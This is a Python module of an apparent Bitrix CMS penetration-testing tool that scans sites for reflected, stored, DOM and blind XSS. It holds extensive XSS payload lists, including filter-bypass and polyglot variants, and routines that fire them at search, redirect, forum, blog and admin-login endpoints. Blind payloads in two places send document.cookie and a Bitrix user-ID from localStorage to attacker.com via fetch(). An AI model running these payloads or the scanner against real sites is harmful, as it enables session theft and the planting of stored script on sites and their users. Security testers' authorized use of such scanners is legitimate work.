#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XSS Scanner Module for Bitrix Pentest Tool
Tests for: Reflected XSS, Stored XSS, DOM-based XSS, Blind XSS
"""

import re
import base64
import html
from urllib.parse import urljoin, quote, parse_qs, urlparse, urlencode
from typing import Dict, List, Optional, Tuple, Any, Set
from dataclasses import dataclass, field, asdict


@dataclass
class XSSFinding:
    """XSS vulnerability finding"""
    severity: str  # critical, high, medium, low
    xss_type: str  # reflected, stored, dom, blind, self
    url: str
    parameter: str
    payload: str
    description: str
    evidence: Optional[str] = None
    context: Optional[str] = None  # html, attribute, script, url, style
    bypass_technique: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class XSSResult:
    """Results of XSS scanning"""
    target: str
    findings: List[XSSFinding] = field(default_factory=list)
    reflected: List[Dict] = field(default_factory=list)
    stored: List[Dict] = field(default_factory=list)
    dom_based: List[Dict] = field(default_factory=list)
    blind: List[Dict] = field(default_factory=list)
    
    def add_finding(self, finding: XSSFinding):
        self.findings.append(finding)
        
        finding_dict = finding.to_dict()
        if finding.xss_type == 'reflected':
            self.reflected.append(finding_dict)
        elif finding.xss_type == 'stored':
            self.stored.append(finding_dict)
        elif finding.xss_type == 'dom':
            self.dom_based.append(finding_dict)
        elif finding.xss_type == 'blind':
            self.blind.append(finding_dict)
    
    def get_critical_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == 'critical')
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'target': self.target,
            'summary': {
                'total_findings': len(self.findings),
                'critical': self.get_critical_count(),
                'high': sum(1 for f in self.findings if f.severity == 'high'),
                'medium': sum(1 for f in self.findings if f.severity == 'medium'),
                'reflected': len(self.reflected),
                'stored': len(self.stored),
                'dom_based': len(self.dom_based),
                'blind': len(self.blind),
            },
            'all_findings': [f.to_dict() for f in self.findings]
        }


class BitrixXSSScanner:
    """
    XSS scanner specialized for Bitrix CMS
    """
    
    # XSS payloads organized by context and bypass technique
    PAYLOADS = {
        'basic': [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            'javascript:alert(1)',
            '"><img src=x onerror=alert(1)>',
            "'><img src=x onerror=alert(1)>",
        ],
        'html_context': [
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<object data=javascript:alert(1)>',
            '<embed src=javascript:alert(1)>',
            '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
            '<video><source onerror=alert(1)>',
            '<audio src=x onerror=alert(1)>',
        ],
        'attribute_context': [
            '" onfocus=alert(1) autofocus="',
            "' onfocus=alert(1) autofocus='",
            '" onmouseover=alert(1) "',
            "' onmouseover=alert(1) '",
            '" onmouseenter=alert(1) "',
            '">><marquee onstart=alert(1)>',
        ],
        'script_context': [
            '</script><script>alert(1)</script>',
            '\';alert(1);//',
            '";alert(1);//',
            '${alert(1)}',
            'alert(1)',
            '";alert(1);"',
            "';alert(1);'",
            '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
        ],
        'url_context': [
            'javascript:alert(1)',
            'javascript:alert(1)//',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:alert(1)',
            'javascript:alert(1);',
        ],
        'style_context': [
            '</style><script>alert(1)</script>',
            'expression(alert(1))',
            '-moz-binding:url(//example.com/xss.xml)',
        ],
        'polyglot': [
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
            '"><img src=x onerror=alert(1)>',
            "'-alert(1)-'",
            '"-alert(1)-"',
            '\'-alert(1)//',
            '\\"-alert(1)//',
        ],
        'bypass': [
            '<img src=x onerror=alert&#40;1&#41;>',
            '<img src=x onerror=alert&#x28;1&#x29;>',
            '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
            '<svg/onload=alert&#40;1&#41;>',
            '"><img src=x onerror=alert&#40;1&#41;>',
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<img src=x onerror=alert/*%00*/(1)>',
            '<img src=x onerror=alert&#x28;1&#x29;>',
            '"><svg/onload=alert(1)>',
            "'><svg/onload=alert(1)>",
        ],
        'blind': [
            '<img src=x onerror=fetch("http://attacker.com/?c="+document.cookie)>',
            '<script>fetch("http://attacker.com/?c="+localStorage.getItem("bx-user-id"))</script>',
            '<img src=x onerror=fetch("http://attacker.com/?c="+document.domain)>',
        ],
    }
    
    # Bitrix-specific parameters often vulnerable to XSS
    BITRIX_PARAMS = [
        'q', 'search', 'query', 'text', 's',
        'backurl', 'redirect_url', 'return_url', 'goto',
        'message', 'error', 'success', 'note',
        'name', 'title', 'description', 'comment',
        'tags', 'code', 'symbol', 'filter',
        'sort', 'by', 'order',
        'ELEMENT_ID', 'SECTION_ID', 'IBLOCK_ID',
        'USER_ID', 'GROUP_ID', 'FORUM_ID',
        'TASK', 'ACTION', 'MODE',
        'bxajaxid', 'sessid',
    ]
    
    # Bitrix endpoints to test
    BITRIX_ENDPOINTS = [
        '/search/',
        '/catalog/',
        '/news/',
        '/about/',
        '/contacts/',
        '/bitrix/admin/',
        '/bitrix/components/bitrix/main.pagenavigation/',
        '/bitrix/components/bitrix/system.auth.form/',
        '/bitrix/components/bitrix/search.page/',
        '/bitrix/components/bitrix/forum.topic.read/',
        '/bitrix/components/bitrix/blog.post/',
        '/bitrix/components/bitrix/socialnetwork.',
    ]
    
    def __init__(self, requester, logger, parser):
        self.requester = requester
        self.logger = logger
        self.parser = parser
        
    def scan(self, target_url: str, aggressive: bool = False) -> XSSResult:
        """
        Main XSS scanning method
        
        Args:
            target_url: Target base URL
            aggressive: Enable stored XSS and blind XSS tests
        
        Returns:
            XSSResult with all findings
        """
        self.logger.info(f"Starting XSS scan for {target_url}")
        result = XSSResult(target=target_url)
        
        base_url = self._normalize_url(target_url)
        
        # 1. Discover endpoints and forms
        self.logger.info("Discovering endpoints...")
        endpoints = self._discover_endpoints(base_url)
        
        # 2. Test for reflected XSS (GET parameters)
        self.logger.info("Testing reflected XSS in GET parameters...")
        self._test_reflected_get(base_url, endpoints, result)
        
        # 3. Test for reflected XSS (POST forms)
        self.logger.info("Testing reflected XSS in POST forms...")
        self._test_reflected_post(base_url, endpoints, result)
        
        # 4. Test for DOM-based XSS
        self.logger.info("Testing DOM-based XSS...")
        self._test_dom_xss(base_url, result)
        
        # 5. Test Bitrix-specific endpoints
        self.logger.info("Testing Bitrix-specific XSS vectors...")
        self._test_bitrix_vectors(base_url, result)
        
        # 6. Test stored XSS (if aggressive)
        if aggressive:
            self.logger.info("Testing stored XSS...")
            self._test_stored_xss(base_url, result)
            self.logger.info("Testing blind XSS...")
            self._test_blind_xss(base_url, result)
        
        # 7. Test for CSP bypass
        self.logger.info("Checking CSP headers...")
        self._test_csp_bypass(base_url, result)
        
        # Summary
        total = len(result.findings)
        critical = result.get_critical_count()
        self.logger.info(f"XSS scan complete: {total} findings ({critical} critical)")
        
        return result
    
    def _normalize_url(self, url: str) -> str:
        """Normalize URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url.rstrip('/')
    
    def _discover_endpoints(self, base_url: str) -> List[Tuple[str, str, Dict[str, str]]]:
        """Discover endpoints with parameters"""
        endpoints = []
        
        # Test common pages
        test_paths = ['/', '/search/', '/catalog/', '/news/', '/about/']
        
        for path in test_paths:
            url = urljoin(base_url, path)
            try:
                resp = self.requester.get(url)
                if not resp:
                    continue
                
                # Parse forms
                forms = self.parser.parse_html_forms(resp.text)
                for form in forms:
                    form_url = urljoin(url, form.get('action', url))
                    method = form.get('method', 'GET').upper()
                    params = {inp['name']: 'test' for inp in form.get('inputs', []) if inp.get('name')}
                    
                    if params:
                        endpoints.append((form_url, method, params))
                
                # Parse links with parameters
                import re
                links = re.findall(r'href="([^"]+\?[^"]+)"', resp.text)
                for link in links:
                    full_url = urljoin(url, link)
                    parsed = urlparse(full_url)
                    if parsed.query:
                        params = {k: 'test' for k in parse_qs(parsed.query).keys()}
                        endpoints.append((full_url.split('?')[0], 'GET', params))
                        
            except Exception as e:
                self.logger.debug(f"Error discovering {url}: {e}")
        
        # Add Bitrix-specific endpoints
        for param in self.BITRIX_PARAMS:
            endpoints.append((f"{base_url}/", 'GET', {param: 'test'}))
        
        # Remove duplicates
        seen = set()
        unique = []
        for ep in endpoints:
            key = (ep[0], ep[1], tuple(sorted(ep[2].items())))
            if key not in seen:
                seen.add(key)
                unique.append(ep)
        
        return unique
    
    def _test_reflected_get(self, base_url: str, endpoints: List, result: XSSResult):
        """Test for reflected XSS in GET parameters"""
        for url, method, params in endpoints:
            if method != 'GET':
                continue
            
            for param_name in list(params.keys()):
                for category, payloads in self.PAYLOADS.items():
                    if category == 'blind':
                        continue
                    
                    for payload in payloads:
                        test_params = params.copy()
                        test_params[param_name] = payload
                        
                        try:
                            test_url = f"{url}?{urlencode(test_params)}"
                            resp = self.requester.get(test_url)
                            
                            if not resp:
                                continue
                            
                            # Check if payload is reflected
                            if self._check_reflection(resp.text, payload, param_name):
                                context = self._determine_context(resp.text, payload)
                                
                                finding = XSSFinding(
                                    severity='high',
                                    xss_type='reflected',
                                    url=test_url,
                                    parameter=param_name,
                                    payload=payload,
                                    description=f"Reflected XSS in {param_name}",
                                    evidence=f"Payload reflected in {context} context",
                                    context=context,
                                    bypass_technique=category if category != 'basic' else None
                                )
                                result.add_finding(finding)
                                self.logger.critical(f"!!! REFLECTED XSS: {url} | {param_name}")
                                break  # Move to next parameter
                                
                        except Exception as e:
                            self.logger.debug(f"Error testing {url}: {e}")
    
    def _test_reflected_post(self, base_url: str, endpoints: List, result: XSSResult):
        """Test for reflected XSS in POST forms"""
        for url, method, params in endpoints:
            if method != 'POST':
                continue
            
            for param_name in list(params.keys()):
                for payload in self.PAYLOADS['basic'] + self.PAYLOADS['html_context']:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    try:
                        resp = self.requester.post(url, data=test_params)
                        
                        if not resp:
                            continue
                        
                        if self._check_reflection(resp.text, payload, param_name):
                            context = self._determine_context(resp.text, payload)
                            
                            finding = XSSFinding(
                                severity='high',
                                xss_type='reflected',
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                description=f"Reflected XSS (POST) in {param_name}",
                                evidence=f"Payload reflected in {context} context",
                                context=context
                            )
                            result.add_finding(finding)
                            self.logger.critical(f"!!! POST XSS: {url} | {param_name}")
                            break
                            
                    except Exception as e:
                        self.logger.debug(f"Error testing POST {url}: {e}")
    
    def _check_reflection(self, content: str, payload: str, param: str) -> bool:
        """Check if payload is reflected in response"""
        # Decode HTML entities for comparison
        decoded_content = html.unescape(content)
        
        # Check exact match
        if payload in content or payload in decoded_content:
            return True
        
        # Check URL encoded version
        encoded_payload = quote(payload)
        if encoded_payload in content:
            return True
        
        # Check common variations
        variations = [
            payload.replace(' ', '+'),
            payload.replace(' ', '%20'),
            payload.lower(),
            payload.replace('alert(1)', 'alert(1)'),  # Case variations
        ]
        
        for var in variations:
            if var in content or var in decoded_content:
                return True
        
        # Check if parameter value appears (might be sanitized)
        if param in content and ('<script' in content or 'onerror' in content or 'onload' in content):
            return True
        
        return False
    
    def _determine_context(self, content: str, payload: str) -> str:
        """Determine the context of XSS (html, attribute, script, etc.)"""
        # Find where payload appears
        pos = content.find(payload)
        if pos == -1:
            pos = content.find(html.unescape(payload))
        
        if pos == -1:
            return 'unknown'
        
        # Check surrounding context
        before = content[max(0, pos-50):pos]
        after = content[pos:pos+50]
        
        # Script context
        if '<script' in before.lower() and '</script>' not in before.lower():
            return 'script'
        
        # Attribute context
        if '=' in before and ('"' in before or "'" in before):
            if before.rstrip().endswith(('"', "'")):
                return 'attribute'
        
        # URL context
        if 'href=' in before or 'src=' in before or 'url=' in before:
            return 'url'
        
        # Style context
        if '<style' in before.lower():
            return 'style'
        
        # HTML context (default)
        return 'html'
    
    def _test_dom_xss(self, base_url: str, result: XSSResult):
        """Test for DOM-based XSS"""
        # Common DOM XSS sources
        dom_tests = [
            f"{base_url}/#<img src=x onerror=alert(1)>",
            f"{base_url}/?search=<img src=x onerror=alert(1)>",
            f"{base_url}/#javascript:alert(1)",
        ]
        
        # Check if hash/fragment is processed by JavaScript
        for test_url in dom_tests:
            try:
                resp = self.requester.get(test_url)
                
                # Look for DOM XSS sinks in JavaScript
                sinks = [
                    'document.write',
                    'innerHTML',
                    'outerHTML',
                    'eval(',
                    'setTimeout(',
                    'setInterval(',
                    'location.href',
                    'location.replace',
                ]
                
                for sink in sinks:
                    if sink in resp.text:
                        # Check if our payload appears near sink
                        if '<img src=x onerror=alert(1)>' in resp.text or 'alert(1)' in resp.text:
                            finding = XSSFinding(
                                severity='high',
                                xss_type='dom',
                                url=test_url,
                                parameter='hash/fragment',
                                payload='<img src=x onerror=alert(1)>',
                                description=f"Potential DOM XSS (sink: {sink})",
                                evidence=f"JavaScript sink found: {sink}",
                                context='script'
                            )
                            result.add_finding(finding)
                            self.logger.warning(f"Potential DOM XSS: {test_url}")
                            return
                            
            except Exception as e:
                self.logger.debug(f"Error testing DOM XSS: {e}")
    
    def _test_bitrix_vectors(self, base_url: str, result: XSSResult):
        """Test Bitrix-specific XSS vectors"""
        
        # Bitrix backurl parameter (common XSS vector)
        backurl_payloads = [
            f"{base_url}/?backurl=javascript:alert(1)",
            f"{base_url}/?backurl=data:text/html,<script>alert(1)</script>",
            f"{base_url}/?return_url=javascript:alert(1)",
            f"{base_url}/?redirect_url=javascript:alert(1)",
        ]
        
        for test_url in backurl_payloads:
            try:
                resp = self.requester.get(test_url)
                
                # Check if backurl is used in link/button without sanitization
                if 'href="javascript:alert(1)"' in resp.text or "href='javascript:alert(1)'" in resp.text:
                    finding = XSSFinding(
                        severity='critical',
                        xss_type='reflected',
                        url=test_url,
                        parameter='backurl',
                        payload='javascript:alert(1)',
                        description="XSS in backurl parameter (Open Redirect -> XSS)",
                        evidence="Unsanitized javascript: protocol in href",
                        context='url'
                    )
                    result.add_finding(finding)
                    self.logger.critical(f"!!! BACKURL XSS: {test_url}")
                    
            except Exception as e:
                self.logger.debug(f"Error testing backurl: {e}")
        
        # Test search parameter
        search_tests = [
            f"{base_url}/search/?q=<script>alert(1)</script>",
            f"{base_url}/?search=<img src=x onerror=alert(1)>",
            f"{base_url}/catalog/?set_filter=Y&arrFilter_pf[NAME]=<script>alert(1)</script>",
        ]
        
        for test_url in search_tests:
            try:
                resp = self.requester.get(test_url)
                
                if '<script>alert(1)</script>' in resp.text or '<img src=x onerror=alert(1)>' in resp.text:
                    finding = XSSFinding(
                        severity='high',
                        xss_type='reflected',
                        url=test_url,
                        parameter='search',
                        payload='<script>alert(1)</script>',
                        description="XSS in search/filter parameter",
                        context='html'
                    )
                    result.add_finding(finding)
                    self.logger.critical(f"!!! SEARCH XSS: {test_url}")
                    break
                    
            except Exception as e:
                self.logger.debug(f"Error testing search: {e}")
    
    def _test_stored_xss(self, base_url: str, result: XSSResult):
        """Test for stored XSS via forms"""
        # Common forms that might store data
        stored_tests = [
            {
                'url': f"{base_url}/bitrix/components/bitrix/forum.topic.reply/",
                'params': {'POST_MESSAGE': '<script>alert(1)</script>', 'sessid': ''},
            },
            {
                'url': f"{base_url}/bitrix/components/bitrix/blog.post.comment/",
                'params': {'comment': '<img src=x onerror=alert(1)>', 'sessid': ''},
            },
            {
                'url': f"{base_url}/bitrix/components/bitrix/socialnetwork.forum.topic.read/",
                'params': {'MESSAGE': '<svg onload=alert(1)>', 'sessid': ''},
            },
        ]
        
        for test in stored_tests:
            try:
                resp = self.requester.post(test['url'], data=test['params'])
                
                # Check if our payload appears in response (might be stored)
                if any(p in resp.text for p in ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>']):
                    finding = XSSFinding(
                        severity='critical',
                        xss_type='stored',
                        url=test['url'],
                        parameter=list(test['params'].keys())[0],
                        payload=test['params'][list(test['params'].keys())[0]],
                        description="Potential stored XSS (verify manually)",
                        evidence="Payload appeared in response after POST"
                    )
                    result.add_finding(finding)
                    self.logger.warning(f"Potential STORED XSS: {test['url']}")
                    
            except Exception as e:
                self.logger.debug(f"Error testing stored XSS: {e}")
    
    def _test_blind_xss(self, base_url: str, result: XSSResult):
        """Test for blind XSS (admin panels, logs, etc.)"""
        # Blind XSS payloads for admin areas
        blind_payloads = [
            '<img src=x onerror=fetch("http://attacker.com/?c="+document.cookie)>',
            '<script>fetch("http://attacker.com/?c="+localStorage.getItem("bx-user-id"))</script>',
            '"><img src=x onerror=fetch("http://attacker.com/?c="+document.domain)>',
        ]
        
        # Admin panel blind XSS
        admin_tests = [
            f"{base_url}/bitrix/admin/",
            f"{base_url}/bitrix/admin/index.php",
        ]
        
        for admin_url in admin_tests:
            for payload in blind_payloads:
                try:
                    # Try to inject via login form (might be logged)
                    resp = self.requester.post(admin_url, data={
                        'USER_LOGIN': payload,
                        'USER_PASSWORD': 'test',
                    })
                    
                    # Note: Blind XSS requires callback server to confirm
                    finding = XSSFinding(
                        severity='high',
                        xss_type='blind',
                        url=admin_url,
                        parameter='USER_LOGIN',
                        payload=payload,
                        description="Blind XSS in admin login (check callback server)",
                        evidence="Payload injected into admin login form"
                    )
                    result.add_finding(finding)
                    self.logger.info(f"Blind XSS payload sent to: {admin_url}")
                    
                except Exception as e:
                    self.logger.debug(f"Error testing blind XSS: {e}")
    
    def _test_csp_bypass(self, base_url: str, result: XSSResult):
        """Check for CSP bypass opportunities"""
        try:
            resp = self.requester.get(base_url)
            
            if 'Content-Security-Policy' in resp.headers:
                csp = resp.headers['Content-Security-Policy']
                
                # Check for unsafe directives
                unsafe_directives = [
                    "unsafe-inline",
                    "unsafe-eval",
                    "data:",
                    "*",
                ]
                
                for directive in unsafe_directives:
                    if directive in csp:
                        finding = XSSFinding(
                            severity='medium',
                            xss_type='self',
                            url=base_url,
                            parameter='CSP',
                            payload=directive,
                            description=f"Weak CSP directive: {directive}",
                            evidence=f"CSP: {csp[:100]}..."
                        )
                        result.add_finding(finding)
                        self.logger.warning(f"Weak CSP: {directive}")
                        
        except Exception as e:
            self.logger.debug(f"Error checking CSP: {e}")


# Testing
if __name__ == "__main__":
    import sys
    import logging
    sys.path.append('..')
    
    from utils.requester import Requester
    from utils.logger import ColoredLogger
    from utils.parser import BitrixParser
    
    logger = ColoredLogger(level=logging.DEBUG)
    requester = Requester()
    parser = BitrixParser()
    
    scanner = BitrixXSSScanner(requester, logger, parser)
    
    if len(sys.argv) > 1:
        result = scanner.scan(sys.argv[1], aggressive=True)
        print(f"\n{'='*60}")
        print(f"CRITICAL: {result.get_critical_count()}")
        print(f"Reflected: {len(result.reflected)}")
        print(f"Stored: {len(result.stored)}")
        print(f"Findings: {len(result.findings)}")